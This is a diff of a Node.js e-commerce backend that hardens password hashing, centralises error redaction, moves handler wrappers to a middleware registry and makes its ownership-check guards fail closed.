@@ -16647,13 +20940,19 @@ async function diracPasswordArgon2V4Hash(password, meta = {}) {
     String(password || ''),
     pepper
   ].join(':');
-  return await argon2.hash(input, {
-    type: argon2.argon2id,
-    memoryCost: params.memoryCost,
-    timeCost: params.timeCost,
-    parallelism: params.parallelism,
-    hashLength: params.hashLength
-  });
+  const salt = crypto.randomBytes(64);
+  try {
+    return await argon2.hash(input, {
+      type: argon2.argon2id,
+      memoryCost: params.memoryCost,
+      timeCost: params.timeCost,
+      parallelism: params.parallelism,
+      hashLength: params.hashLength,
+      salt
+    });
+  } finally {
+    salt.fill(0);
+  }
 }
 
 function diracPasswordArgon2V4Params() {
@@ -16680,7 +20979,12 @@ function diracPasswordArgon2V4Pepper() {
 }
 
 function diracPasswordArgon2V4Hmac(value) {
-  const secret = diracPasswordArgon2V4Pepper() || 'dirac-password-shadow-v4-fallback';
+  const secret = diracPasswordArgon2V4Pepper();
+  if (Buffer.byteLength(secret, 'utf8') < 64) {
+    const error = new Error('DIRAC_PASSWORD_HMAC_PEPPER_INVALID');
+    error.code = 'DIRAC_PASSWORD_HMAC_PEPPER_INVALID';
+    throw error;
+  }
   return crypto.createHmac('sha256', secret).update(String(value || '')).digest('hex');
 }
 
@@ -16695,9 +20999,7 @@ function diracPasswordArgon2V4EnvTrue(name) {
 }
 
 function diracPasswordArgon2V4SafeError(error) {
-  const code = String(error && (error.code || error.name || error.message) || 'PASSWORD_ARGON2_SHADOW_V4_ERROR');
-  if (/password|token|secret|cookie|authorization|service_role|apikey/i.test(code)) return 'PASSWORD_ARGON2_SHADOW_V4_ERROR';
-  return code.slice(0, 120);
+  return diracSecurityRedactDiagnosticV210(error || 'PASSWORD_ARGON2_SHADOW_V4_ERROR', 120);
 }
 
 /* ============================================================
@@ -16791,23 +21093,23 @@ try {
   }
 } catch (_) {}
 
-const __diracV110PreviousHandler = module.exports;
+const __diracV110PreviousHandler = __diracV202DispatcherSentinel;
 
-module.exports = async function diracAuthHardeningSafeWrapperV110(req, res) {
+__diracV202RegisterMiddleware(async function diracAuthHardeningSafeWrapperV110(req, res, nextHandlerV202) {
   try { if (res && typeof res.setHeader === 'function') res.setHeader('X-Dirac-Auth-Hardening-Patch', DIRAC_AUTH_HARDENING_SAFE_PATCH_V110); } catch (_) {}
 
   const action = diracV110NormalizeAction(String((req && req.query && req.query.action) || ''));
   const method = String((req && req.method) || '').toUpperCase();
 
   if (!diracV110ShouldAuditAction(action, method)) {
-    return __diracV110PreviousHandler(req, res);
+    return nextHandlerV202(req, res);
   }
 
   const originalStatus = typeof res.status === 'function' ? res.status.bind(res) : null;
   const originalJson = typeof res.json === 'function' ? res.json.bind(res) : null;
   let capturedStatus = Number(res.statusCode || 200);
 
-  if (!originalJson) return __diracV110PreviousHandler(req, res);
+  if (!originalJson) return nextHandlerV202(req, res);
 
   res.status = function diracV110Status(code) {
     capturedStatus = Number(code || capturedStatus || 200);
@@ -16826,8 +21128,8 @@ module.exports = async function diracAuthHardeningSafeWrapperV110(req, res) {
     return originalJson(payload);
   };
 
-  return __diracV110PreviousHandler(req, res);
-};
+  return nextHandlerV202(req, res);
+}, "diracAuthHardeningSafeWrapperV110");
 
 function diracV110CheckPasswordPolicy(password, email) {
   const value = String(password || '');
@@ -17096,9 +21398,7 @@ function diracV110Hmac(value) {
 }
 
 function diracV110SafeError(error) {
-  const code = String(error && (error.code || error.name || error.message) || 'DIRAC_AUTH_AUDIT_ERROR');
-  if (/password|token|secret|cookie|authorization|service_role|apikey/i.test(code)) return 'DIRAC_AUTH_AUDIT_ERROR';
-  return code.slice(0, 120);
+  return diracSecurityRedactDiagnosticV210(error || 'DIRAC_AUTH_AUDIT_ERROR', 120);
 }
 
 function diracV110EnvTrue(name) {
@@ -17115,12 +21415,12 @@ function diracV110EnvTrue(name) {
    - Endpoint tambahan GET katalog hanya membaca produk aktif/ready untuk HTML lihat-lihat.
    ============================================================ */
 const DIRAC_PERFUME_CHECKOUT_CATALOG_PATCH_V112 = 'dirac-perfume-checkout-catalog-v112';
-const __diracPerfumeCatalogV112PreviousHandler = module.exports;
+const __diracPerfumeCatalogV112PreviousHandler = __diracV202DispatcherSentinel;
 
-module.exports = async function diracPerfumeCatalogV112Wrapper(req, res) {
+__diracV202RegisterMiddleware(async function diracPerfumeCatalogV112Wrapper(req, res, nextHandlerV202) {
   const action = diracPerfumeCatalogV112NormalizeAction(String((req && req.query && req.query.action) || ''));
   if (!diracPerfumeCatalogV112IsCatalogAction(action)) {
-    return __diracPerfumeCatalogV112PreviousHandler(req, res);
+    return nextHandlerV202(req, res);
   }
 
   const method = String((req && req.method) || 'GET').toUpperCase();
@@ -17151,7 +21451,7 @@ module.exports = async function diracPerfumeCatalogV112Wrapper(req, res) {
     console.error('[dirac-public-products-v112]', diracPerfumeCatalogV112SafeError(error));
     return res.status(500).json({ ok: false, message: 'Katalog produk belum bisa dimuat.' });
   }
-};
+}, "diracPerfumeCatalogV112Wrapper");
 
 function diracPerfumeCatalogV112NormalizeAction(action) {
   return String(action || '').trim().toLowerCase().replace(/[\s-]+/g, '_');
@@ -17214,9 +21514,7 @@ async function diracPerfumeCatalogV112Handle(req, res) {
 }
 
 function diracPerfumeCatalogV112SafeError(error) {
-  const msg = String(error && (error.code || error.name || error.message) || 'PUBLIC_PRODUCTS_ERROR');
-  if (/password|token|secret|cookie|authorization|service_role|apikey/i.test(msg)) return 'PUBLIC_PRODUCTS_ERROR';
-  return msg.slice(0, 160);
+  return diracSecurityRedactDiagnosticV210(error || 'PUBLIC_PRODUCTS_ERROR', 160);
 }
 
 /* ============================================================
@@ -17226,12 +21524,12 @@ function diracPerfumeCatalogV112SafeError(error) {
    - Tidak mengubah endpoint lama, login, hash, A2F/MFA, payment gateway, cookie, dashboard.
    ============================================================ */
 const DIRAC_PERFUME_CATALOG_SLUG_FIX_V116 = 'dirac-perfume-catalog-slug-fix-v116';
-const __diracPerfumeCatalogV116PreviousHandler = module.exports;
+const __diracPerfumeCatalogV116PreviousHandler = __diracV202DispatcherSentinel;
 
-module.exports = async function diracPerfumeCatalogV116Wrapper(req, res) {
+__diracV202RegisterMiddleware(async function diracPerfumeCatalogV116Wrapper(req, res, nextHandlerV202) {
   const action = diracPerfumeCatalogV116NormalizeAction(String((req && req.query && req.query.action) || ''));
   if (!diracPerfumeCatalogV116IsCatalogAction(action)) {
-    return __diracPerfumeCatalogV116PreviousHandler(req, res);
+    return nextHandlerV202(req, res);
   }
 
   const method = String((req && req.method) || 'GET').toUpperCase();
@@ -17263,7 +21561,7 @@ module.exports = async function diracPerfumeCatalogV116Wrapper(req, res) {
     console.error('[dirac-public-products-v116]', diracPerfumeCatalogV116SafeError(error));
     return res.status(500).json({ ok: false, message: 'Katalog produk belum bisa dimuat.' });
   }
-};
+}, "diracPerfumeCatalogV116Wrapper");
 
 function diracPerfumeCatalogV116NormalizeAction(action) {
   return String(action || '').trim().toLowerCase().replace(/[\s-]+/g, '_');
@@ -17432,9 +21730,7 @@ async function sessionOwnershipCheckoutFindProductForCheckout(body, requestedPro
 }
 
 function diracPerfumeCatalogV116SafeError(error) {
-  const msg = String(error && (error.code || error.name || error.message) || 'PUBLIC_PRODUCTS_ERROR');
-  if (/password|token|secret|cookie|authorization|service_role|apikey/i.test(msg)) return 'PUBLIC_PRODUCTS_ERROR';
-  return msg.slice(0, 160);
+  return diracSecurityRedactDiagnosticV210(error || 'PUBLIC_PRODUCTS_ERROR', 160);
 }
 
 /* ============================================================
@@ -17446,12 +21742,12 @@ function diracPerfumeCatalogV116SafeError(error) {
    - Tidak mengekspos cost_price atau data sensitif internal.
    ============================================================ */
 const DIRAC_PERFUME_PUBLIC_PRODUCTS_TABLE_READER_V117 = 'dirac-perfume-public-products-table-reader-v117';
-const __diracPerfumePublicProductsV117PreviousHandler = module.exports;
+const __diracPerfumePublicProductsV117PreviousHandler = __diracV202DispatcherSentinel;
 
-module.exports = async function diracPerfumePublicProductsV117Wrapper(req, res) {
+__diracV202RegisterMiddleware(async function diracPerfumePublicProductsV117Wrapper(req, res, nextHandlerV202) {
   const action = diracPerfumePublicProductsV117NormalizeAction(String((req && req.query && req.query.action) || ''));
   if (!diracPerfumePublicProductsV117IsCatalogAction(action)) {
-    return __diracPerfumePublicProductsV117PreviousHandler(req, res);
+    return nextHandlerV202(req, res);
   }
 
   const method = String((req && req.method) || 'GET').toUpperCase();
@@ -17483,7 +21779,7 @@ module.exports = async function diracPerfumePublicProductsV117Wrapper(req, res) 
     console.error('[dirac-public-products-v117]', diracPerfumePublicProductsV117SafeError(error));
     return res.status(500).json({ ok: false, message: 'Katalog produk belum bisa dimuat.' });
   }
-};
+}, "diracPerfumePublicProductsV117Wrapper");
 
 function diracPerfumePublicProductsV117NormalizeAction(action) {
   return String(action || '').trim().toLowerCase().replace(/[\s-]+/g, '_');
@@ -17512,7 +21808,7 @@ async function diracPerfumePublicProductsV117Handle(req, res) {
 
   const limitRaw = Number((req && req.query && (req.query.limit || req.query.per_page)) || 5000);
   const limit = Number.isFinite(limitRaw) ? Math.min(Math.max(Math.floor(limitRaw), 1), 5000) : 5000;
-  const select = 'slug,doc_id,firebase_id,title,name,price,stock,status,is_ready,is_active,img,image_url,description,notes,long_description';
+  const select = 'slug,doc_id,firebase_id,title,name,category,price,stock,status,is_ready,is_active,img,image_url,description,notes,long_description';
   const path = '/rest/v1/products?select=' + encodeURIComponent(select)
     + '&order=doc_id.asc'
     + '&limit=' + encodeURIComponent(String(limit));
@@ -17545,6 +21841,7 @@ async function diracPerfumePublicProductsV117Handle(req, res) {
         firebaseId,
         title: diracPerfumePublicProductsV117Clean(row.title || row.name || 'Produk Parfum', 180),
         name: diracPerfumePublicProductsV117Clean(row.name || row.title || 'Produk Parfum', 180),
+        category: diracPerfumePublicProductsV117Clean(row.category || '', 80),
         price,
         price_label: formatCurrency(price, 'IDR'),
         stock: Number.isFinite(Number(row.stock)) ? Number(row.stock) : null,
@@ -17588,9 +21885,7 @@ function diracPerfumePublicProductsV117Money(value) {
 }
 
 function diracPerfumePublicProductsV117SafeError(error) {
-  const msg = String(error && (error.code || error.name || error.message) || 'PUBLIC_PRODUCTS_ERROR');
-  if (/password|token|secret|cookie|authorization|service_role|apikey/i.test(msg)) return 'PUBLIC_PRODUCTS_ERROR';
-  return msg.slice(0, 160);
+  return diracSecurityRedactDiagnosticV210(error || 'PUBLIC_PRODUCTS_ERROR', 160);
 }
 
 
@@ -17840,9 +22135,9 @@ function diracUltraXssV2DetectRequest(req) {
   return { detected: false, kind: '' };
 }
 
-const __diracUltraXssV2PreviousHandler = module.exports;
+const __diracUltraXssV2PreviousHandler = __diracV202DispatcherSentinel;
 
-module.exports = async function diracUltraXssAttackHardeningWrapperV2(req, res) {
+__diracV202RegisterMiddleware(async function diracUltraXssAttackHardeningWrapperV2(req, res, nextHandlerV202) {
   try {
     if (typeof diracApplySecurityResponseHeaders === 'function') diracApplySecurityResponseHeaders(res);
   } catch (_) {}
@@ -17857,8 +22152,8 @@ module.exports = async function diracUltraXssAttackHardeningWrapperV2(req, res) 
     });
   }
 
-  return __diracUltraXssV2PreviousHandler(req, res);
-};
+  return nextHandlerV202(req, res);
+}, "diracUltraXssAttackHardeningWrapperV2");
 
 /* ============================================================
    DIRAC ULTRA XSS ONE-STRIKE PERMANENT BLOCK v3 - APPEND ONLY
@@ -17873,9 +22168,9 @@ module.exports = async function diracUltraXssAttackHardeningWrapperV2(req, res) 
    ============================================================ */
 
 const DIRAC_ULTRA_XSS_ONE_STRIKE_BLOCK_V3 = 'dirac-ultra-xss-one-strike-permanent-block-v3';
-const __diracUltraXssV3PreviousHandler = module.exports;
+const __diracUltraXssV3PreviousHandler = __diracV202DispatcherSentinel;
 
-module.exports = async function diracUltraXssOneStrikePermanentBlockWrapperV3(req, res) {
+__diracV202RegisterMiddleware(async function diracUltraXssOneStrikePermanentBlockWrapperV3(req, res, nextHandlerV202) {
   try {
     if (res && typeof res.setHeader === 'function') {
       res.setHeader('X-Dirac-XSS-One-Strike-Patch', DIRAC_ULTRA_XSS_ONE_STRIKE_BLOCK_V3);
@@ -17916,8 +22211,8 @@ module.exports = async function diracUltraXssOneStrikePermanentBlockWrapperV3(re
     return diracUltraXssV3BlockedResponse(res, 'XSS_SECURITY_GUARD_ERROR');
   }
 
-  return __diracUltraXssV3PreviousHandler(req, res);
-};
+  return nextHandlerV202(req, res);
+}, "diracUltraXssOneStrikePermanentBlockWrapperV3");
 
 function diracUltraXssV3ShouldSkipPermanentBlock(req, action, method) {
   if (diracUltraXssV3EnvTrue('DIRAC_XSS_ONE_STRIKE_BLOCK_DISABLED')) return true;
@@ -17959,7 +22254,7 @@ async function diracUltraXssV3RegisterPermanentBlock(req, res, action, method, x
   // Cookie hard-ban browser; tidak menyimpan cookie mentah ke database.
   try {
     if (res && typeof res.setHeader === 'function' && typeof diracV107Hmac === 'function' && typeof diracV107KeysForValue === 'function') {
-      const cookieValue = diracV107Hmac('xss-cookie|' + String(now) + '|' + String(Math.random())).slice(0, 64);
+      const cookieValue = diracV107Hmac('xss-cookie|' + String(now) + '|' + crypto.randomBytes(32).toString('base64url')).slice(0, 64);
       const maxAge = Math.max(60, Math.min(Math.floor((blockedUntilMs - now) / 1000), 2147483647));
       res.setHeader('Set-Cookie', 'dirac_global_hard_ban=' + cookieValue + '; Path=/; Max-Age=' + maxAge + '; HttpOnly; Secure; SameSite=Lax');
       keys.push(...diracV107KeysForValue('cookie', 'cookie|' + cookieValue));
@@ -18052,9 +22347,7 @@ function diracUltraXssV3EnvTrue(name) {
 }
 
 function diracUltraXssV3SafeError(error) {
-  const message = String(error && error.message ? error.message : error || 'error');
-  if (/password|token|secret|cookie|authorization|apikey|service_role/i.test(message)) return 'security_internal_error';
-  return message.slice(0, 180);
+  return diracSecurityRedactDiagnosticV210(error || 'security_internal_error', 180);
 }
 
 /* ============================================================
@@ -18143,13 +22436,13 @@ try {
 } catch (_) {}
 
 try {
-  if (typeof module !== 'undefined' && module.exports && typeof module.exports === 'function' && !module.exports.__diracSqlPrecisionV108HeaderWrapped) {
-    const __diracSqlPrecisionV108PreviousHandler = module.exports;
-    module.exports = async function diracSqlPrecisionV108HeaderWrapper(req, res) {
+  if (typeof module !== 'undefined' && __diracV202DispatcherSentinel && typeof __diracV202DispatcherSentinel === 'function' && !__diracV202DispatcherSentinel.__diracSqlPrecisionV108HeaderWrapped) {
+    const __diracSqlPrecisionV108PreviousHandler = __diracV202DispatcherSentinel;
+    __diracV202RegisterMiddleware(async function diracSqlPrecisionV108HeaderWrapper(req, res, nextHandlerV202) {
       try { if (res && typeof res.setHeader === 'function') res.setHeader('X-Dirac-SQL-Precision-Patch-V108', DIRAC_SQLMAP_Sqli_PRECISION_PATCH_V108); } catch (_) {}
-      return __diracSqlPrecisionV108PreviousHandler(req, res);
-    };
-    Object.defineProperty(module.exports, '__diracSqlPrecisionV108HeaderWrapped', { value: true, enumerable: false });
+      return nextHandlerV202(req, res);
+    }, "diracSqlPrecisionV108HeaderWrapper");
+    __diracV202MarkWrapperFlag("__diracSqlPrecisionV108HeaderWrapped");
   }
 } catch (_) {}
 
@@ -18350,7 +22643,7 @@ function diracV119ShouldInspectSupabaseWrite(path, options = {}) {
   // Jangan ganggu tabel keamanan, session/logout, dan payment gateway/provider payload.
   if (/^security_customer_/i.test(table)) return false;
   if (table === 'dirac_security_rate_limits') return false;
-  if (table === String(process.env.LOGIN_SECURITY_PERSIST_TABLE || '').trim()) return false;
+  if (table === DIRAC_PERSISTENT_BAN_TABLE || table === DIRAC_S2S_SECURITY_TABLE) return false;
   if (table === String(process.env.DOMAIN_LOGIN_RATE_TABLE || '').trim()) return false;
   if (/^payment_/i.test(table) || table === 'payment_transactions' || table === 'payment_gateway_events') return false;
 
@@ -18671,9 +22964,9 @@ try {
 } catch (_) {}
 
 try {
-  if (typeof module !== 'undefined' && module.exports && typeof module.exports === 'function' && !module.exports.__diracBodyInputThreatV119Wrapped) {
-    const __diracV119PreviousHandler = module.exports;
-    module.exports = async function diracBodyInputThreatBlockV119Wrapper(req, res) {
+  if (typeof module !== 'undefined' && __diracV202DispatcherSentinel && typeof __diracV202DispatcherSentinel === 'function' && !__diracV202DispatcherSentinel.__diracBodyInputThreatV119Wrapped) {
+    const __diracV119PreviousHandler = __diracV202DispatcherSentinel;
+    __diracV202RegisterMiddleware(async function diracBodyInputThreatBlockV119Wrapper(req, res, nextHandlerV202) {
       try {
         if (res && typeof res.setHeader === 'function') {
           res.setHeader('X-Dirac-Body-Input-Threat-Block', DIRAC_GLOBAL_BODY_INPUT_THREAT_BLOCK_V119);
@@ -18681,15 +22974,15 @@ try {
       } catch (_) {}
 
       try {
-        return await __diracV119PreviousHandler(req, res);
+        return await nextHandlerV202(req, res);
       } catch (error) {
         if (error && (error.code === 'REQUEST_BLOCKED' || error.code === 'SERVICE_ROLE_PATH_REJECTED' || error.message === 'REQUEST_BLOCKED_BY_BODY_GUARD' || error.message === 'SUPABASE_WRITE_BLOCKED_BY_BODY_THREAT_GUARD')) {
           return diracV119BlockedResponse(res, error && error.code || 'REQUEST_BLOCKED');
         }
         throw error;
       }
-    };
-    Object.defineProperty(module.exports, '__diracBodyInputThreatV119Wrapped', { value: true, enumerable: false });
+    }, "diracBodyInputThreatBlockV119Wrapper");
+    __diracV202MarkWrapperFlag("__diracBodyInputThreatV119Wrapped");
   }
 } catch (_) {}
 
@@ -18712,7 +23005,7 @@ const DIRAC_CSRF_RESPONSE_HEADER = 'X-Dirac-CSRF-Token';
 const DIRAC_CSRF_TOKEN_TYPE = 'dirac-csrf-hmac-v1';
 const DIRAC_CSRF_MAX_AGE_SECONDS = Math.max(300, Math.min(24 * 60 * 60, Number(process.env.DIRAC_CSRF_MAX_AGE_SECONDS || 2 * 60 * 60)));
 const DIRAC_CSRF_CLOCK_SKEW_SECONDS = 60;
-const __diracCsrfHmacPreviousHandler = module.exports;
+const __diracCsrfHmacPreviousHandler = __diracV202DispatcherSentinel;
 
 const DIRAC_CSRF_DEFAULT_ACTIONS = new Set([
   // Order/domain write. Bukan payment gateway wrapper.
@@ -18757,7 +23050,7 @@ try {
   }
 } catch (_) {}
 
-module.exports = async function diracCsrfHmacWrapper(req, res) {
+__diracV202RegisterMiddleware(async function diracCsrfHmacWrapper(req, res, nextHandlerV202) {
   const method = String((req && req.method) || 'GET').toUpperCase();
   const rawAction = String((req && req.query && req.query.action) || '').trim();
   const action = diracCsrfNormalizeAction(rawAction);
@@ -18766,14 +23059,14 @@ module.exports = async function diracCsrfHmacWrapper(req, res) {
     diracCsrfApplyResponseHeaders(res);
 
     if (method === 'OPTIONS') {
-      return __diracCsrfHmacPreviousHandler(req, res);
+      return nextHandlerV202(req, res);
     }
 
     // Mint token di safe-read response supaya frontend bisa mulai mengirim
     // X-CSRF-Token tanpa endpoint baru.
     if (method === 'GET' || method === 'HEAD') {
       diracCsrfIssueToken(req, res, action);
-      return __diracCsrfHmacPreviousHandler(req, res);
+      return nextHandlerV202(req, res);
     }
 
     if (diracCsrfShouldCheckRequest(action, method)) {
@@ -18792,7 +23085,7 @@ module.exports = async function diracCsrfHmacWrapper(req, res) {
       }
     }
 
-    return __diracCsrfHmacPreviousHandler(req, res);
+    return nextHandlerV202(req, res);
   } catch (error) {
     console.error('[dirac-csrf-hmac]', diracCsrfSafeError(error));
     return res.status(500).json({
@@ -18802,7 +23095,7 @@ module.exports = async function diracCsrfHmacWrapper(req, res) {
       source: DIRAC_CSRF_HMAC_PATCH
     });
   }
-};
+}, "diracCsrfHmacWrapper");
 
 function diracCsrfShouldCheckRequest(action, method) {
   const upperMethod = String(method || '').toUpperCase();
@@ -19099,9 +23392,7 @@ function diracCsrfSha256(value) {
 }
 
 function diracCsrfSafeError(error) {
-  const message = String(error && error.message ? error.message : error || 'unknown').slice(0, 180);
-  if (/password|token|secret|cookie|authorization|service_role|apikey|csrf|hmac/i.test(message)) return 'csrf_internal_error';
-  return message;
+  return diracSecurityRedactDiagnosticV210(error || 'csrf_internal_error', 180);
 }
 
 /* ============================================================
@@ -19117,13 +23408,13 @@ function diracCsrfSafeError(error) {
    ============================================================ */
 
 const DIRAC_BACKEND_XSS_RESPONSE_HARDENING_V4 = 'dirac-backend-xss-response-hardening-v4';
-const __diracBackendXssV4PreviousHandler = module.exports;
+const __diracBackendXssV4PreviousHandler = __diracV202DispatcherSentinel;
 
-module.exports = async function diracBackendXssResponseHardeningWrapperV4(req, res) {
+__diracV202RegisterMiddleware(async function diracBackendXssResponseHardeningWrapperV4(req, res, nextHandlerV202) {
   try { diracBackendXssV4ApplyHeaders(req, res); } catch (_) {}
   try { diracBackendXssV4InstallJsonOutputGuard(req, res); } catch (_) {}
-  return __diracBackendXssV4PreviousHandler(req, res);
-};
+  return nextHandlerV202(req, res);
+}, "diracBackendXssResponseHardeningWrapperV4");
 
 function diracBackendXssV4ApplyHeaders(req, res) {
   if (!res || typeof res.setHeader !== 'function') return;
@@ -19298,9 +23589,9 @@ function diracBackendXssV4EnvTrue(name) {
    ============================================================ */
 
 const DIRAC_ADVANCED_BACKEND_HARDENING_V5 = 'dirac-advanced-backend-passive-hardening-v5';
-const __diracAdvancedBackendV5PreviousHandler = module.exports;
+const __diracAdvancedBackendV5PreviousHandler = __diracV202DispatcherSentinel;
 
-module.exports = async function diracAdvancedBackendPassiveHardeningWrapperV5(req, res) {
+__diracV202RegisterMiddleware(async function diracAdvancedBackendPassiveHardeningWrapperV5(req, res, nextHandlerV202) {
   const action = diracAdvancedBackendV5Action(req);
   if (!diracAdvancedBackendV5IsProtectedAction(action)) {
     try { diracAdvancedBackendV5ApplyPassiveHeaders(req, res); } catch (_) {}
@@ -19309,8 +23600,8 @@ module.exports = async function diracAdvancedBackendPassiveHardeningWrapperV5(re
     try { diracAdvancedBackendV5ApplyObservabilityHeaders(res, decision); } catch (_) {}
   }
 
-  return __diracAdvancedBackendV5PreviousHandler(req, res);
-};
+  return nextHandlerV202(req, res);
+}, "diracAdvancedBackendPassiveHardeningWrapperV5");
 
 function diracAdvancedBackendV5ApplyPassiveHeaders(req, res) {
   if (!res || typeof res.setHeader !== 'function') return;
@@ -19807,17 +24098,17 @@ try {
 } catch (_) {}
 
 try {
-  const __diracBolaIdorV121PreviousHandler = module.exports;
+  const __diracBolaIdorV121PreviousHandler = __diracV202DispatcherSentinel;
   if (typeof __diracBolaIdorV121PreviousHandler === 'function' && !__diracBolaIdorV121PreviousHandler.__diracBolaIdorV121Wrapped) {
-    module.exports = async function diracBolaIdorServiceScopeContextWrapperV121(req, res) {
+    __diracV202RegisterMiddleware(async function diracBolaIdorServiceScopeContextWrapperV121(req, res, nextHandlerV202) {
       const context = diracBolaIdorV121BuildRequestContext(req);
       if (diracBolaIdorAsyncLocalV121 && typeof diracBolaIdorAsyncLocalV121.run === 'function') {
-        return diracBolaIdorAsyncLocalV121.run(context, () => __diracBolaIdorV121PreviousHandler(req, res));
+        return diracBolaIdorAsyncLocalV121.run(context, () => nextHandlerV202(req, res));
       }
       try { if (req && typeof req === 'object') req.__diracBolaIdorContextV121 = context; } catch (_) {}
-      return __diracBolaIdorV121PreviousHandler(req, res);
-    };
-    Object.defineProperty(module.exports, '__diracBolaIdorV121Wrapped', { value: true, enumerable: false });
+      return nextHandlerV202(req, res);
+    }, "diracBolaIdorServiceScopeContextWrapperV121");
+    __diracV202MarkWrapperFlag("__diracBolaIdorV121Wrapped");
   }
 } catch (_) {}
 
@@ -20117,8 +24408,8 @@ try {
 } catch (_) {}
 
 try {
-  if (typeof module !== 'undefined' && module.exports && typeof module.exports === 'function') {
-    Object.defineProperty(module.exports, '__diracBolaIdorV122StrictSafe', { value: true, enumerable: false });
+  if (typeof module !== 'undefined' && __diracV202DispatcherSentinel && typeof __diracV202DispatcherSentinel === 'function') {
+    __diracV202MarkWrapperFlag("__diracBolaIdorV122StrictSafe");
   }
 } catch (_) {}
 
@@ -20138,11 +24429,30 @@ function diracBolaIdorV122InspectStrictSafe(path, options = {}) {
     if (!policy) return { ok: true };
 
     const method = String(options.method || 'GET').toUpperCase();
-    const ctx = diracBolaIdorV122CurrentContext() || {};
+    const centralCtxV213 = typeof diracCentralCurrentContextV149 === 'function' ? diracCentralCurrentContextV149() : null;
+    const centralBootstrapV213 = diracBolaIdorV128CentralOwnerBootstrapDecisionV213(rawPath, options, {
+      req: centralCtxV213 && centralCtxV213.req,
+      action: centralCtxV213 && centralCtxV213.action
+    });
+    if (centralBootstrapV213 && centralBootstrapV213.ok === true) {
+      return { ok: true, table, method, action: String(centralCtxV213 && centralCtxV213.action || ''), scoped: true, bootstrap: DIRAC_CENTRAL_OWNER_BOOTSTRAP_PATCH_V213 };
+    }
+
+    const trustedCentralCtxV213 = centralCtxV213
+      && typeof diracCentralGatewayContextAllowedV211 === 'function'
+      && diracCentralGatewayContextAllowedV211(centralCtxV213).ok === true
+      && centralCtxV213.guardPassport
+      && centralCtxV213.guardPassport.whitelist_checked === true
+      && centralCtxV213.guardPassport.classification_checked === true
+      && centralCtxV213.action
+      && ACTION_POLICY[centralCtxV213.action]
+      && centralCtxV213.policy === ACTION_POLICY[centralCtxV213.action]
+        ? centralCtxV213
+        : null;
+    const ctx = diracBolaIdorV122CurrentContext() || trustedCentralCtxV213 || {};
     const action = diracBolaIdorV122NormalizeAction(ctx.action || '');
 
-    // Jangan hard-block request di luar context HTTP normal. Ini menghindari risiko job/helper internal patah.
-    if (!action) return { ok: true, table, method, action, reason: 'no_http_action_context' };
+    if (!action) return { ok: false, warn: true, block: true, table, method, action, reason: 'service_role_http_action_context_required' };
 
     const ownerScoped = diracBolaIdorV122HasOwnerScope(rawPath, options.body, policy.ownerColumns);
     const safeInsert = method === 'POST' && policy.insertMayUseBodyOwner && diracBolaIdorV122BodyHasAllOwners(options.body, policy.requiredBodyOwners || policy.ownerColumns);
@@ -20167,7 +24477,7 @@ function diracBolaIdorV122InspectStrictSafe(path, options = {}) {
       patch: DIRAC_BOLA_IDOR_STRICT_SAFE_PATCH_V122
     };
   } catch (error) {
-    return { ok: true, error: 'bola_idor_v122_guard_failed_open' };
+    return { ok: false, warn: true, block: true, reason: 'bola_idor_v122_guard_exception', error: diracSecurityRedactDiagnosticV210(error, 120) };
   }
 }
 
@@ -20430,8 +24740,39 @@ function diracBolaIdorV126InspectOwnerValue(path, options = {}) {
     if (diracBolaIdorV126IsSensitiveFlowAction(action)) return { ok: true };
     if (!diracBolaIdorV126IsUserDataAction(action)) return { ok: true };
 
+    // PATCH v214: permit only the exact, fully Central-Guard-bound self owner-bootstrap
+    // read that v128 has already validated. This does not bypass Central Guard and does
+    // not permit any other table, method, action, UUID, filter, query shape, or body.
+    const bootstrapContextV214 = typeof diracBolaIdorV128CurrentContext === 'function'
+      ? diracBolaIdorV128CurrentContext()
+      : null;
+    const bootstrapDecisionV214 = typeof diracBolaIdorV128CentralOwnerBootstrapDecisionV213 === 'function'
+      ? diracBolaIdorV128CentralOwnerBootstrapDecisionV213(rawPath, options, bootstrapContextV214)
+      : { relevant: false, ok: false };
+    if (bootstrapDecisionV214 && bootstrapDecisionV214.relevant === true) {
+      if (bootstrapDecisionV214.ok === true) {
+        return {
+          ok: true,
+          table,
+          method,
+          action,
+          owner_bootstrap_v214: true,
+          diagnostic_code: 'OWNER_BOOTSTRAP_V126_EXACT_SELF_READ_ALLOWED'
+        };
+      }
+      return {
+        ok: false,
+        warn: true,
+        block: true,
+        table,
+        method,
+        action,
+        reason: String(bootstrapDecisionV214.code || 'owner_bootstrap_v126_rejected')
+      };
+    }
+
     const allowed = diracBolaIdorV126AllowedCustomerIds(ctx);
-    if (!allowed.length) return { ok: true, table, method, action, reason: 'trusted_owner_not_yet_available' };
+    if (!allowed.length) return { ok: false, warn: true, block: true, table, method, action, reason: 'trusted_owner_required' };
 
     const requested = diracBolaIdorV126RequestedCustomerIds(rawPath, options.body);
     if (!requested.length) return { ok: true };
@@ -20452,7 +24793,7 @@ function diracBolaIdorV126InspectOwnerValue(path, options = {}) {
       patch: DIRAC_BOLA_IDOR_OWNER_VALUE_BINDING_PATCH_V126
     };
   } catch (error) {
-    return { ok: true, error: 'bola_idor_v126_guard_failed_open' };
+    return { ok: false, warn: true, block: true, reason: 'bola_idor_v126_guard_exception', error: diracSecurityRedactDiagnosticV210(error, 120) };
   }
 }
 
@@ -20556,7 +24897,12 @@ function diracBolaIdorV126ParseOrFilterValues(value, column) {
 
 function diracBolaIdorV126AllowedCustomerIds(ctx) {
   try {
-    const ids = Array.isArray(ctx && ctx.allowedCustomerIdsV126) ? ctx.allowedCustomerIdsV126 : [];
+    const ids = Array.isArray(ctx && ctx.allowedCustomerIdsV126) ? [...ctx.allowedCustomerIdsV126] : [];
+    const req = ctx && ctx.req || (typeof diracCentralCurrentContextV149 === 'function' && diracCentralCurrentContextV149() && diracCentralCurrentContextV149().req);
+    const verifiedOwner = typeof diracCentralOwnerFromVerifiedContextV215 === 'function'
+      ? diracCentralOwnerFromVerifiedContextV215(req)
+      : null;
+    if (verifiedOwner && Array.isArray(verifiedOwner.customerIds)) ids.push(...verifiedOwner.customerIds);
     return Array.from(new Set(ids.map((id) => String(id || '').trim()).filter(diracBolaIdorV126LooksLikeUuid))).slice(0, 25);
   } catch (_) { return []; }
 }
@@ -20709,6 +25055,7 @@ function diracBolaIdorV126SeenStore() {
    ============================================================ */
 
 const DIRAC_BOLA_IDOR_GLOBAL_HARD_BAN_PATCH_V128 = 'dirac-bola-idor-global-hard-ban-v128';
+const DIRAC_CENTRAL_OWNER_BOOTSTRAP_PATCH_V213 = 'dirac-central-owner-bootstrap-deadlock-fix-v213';
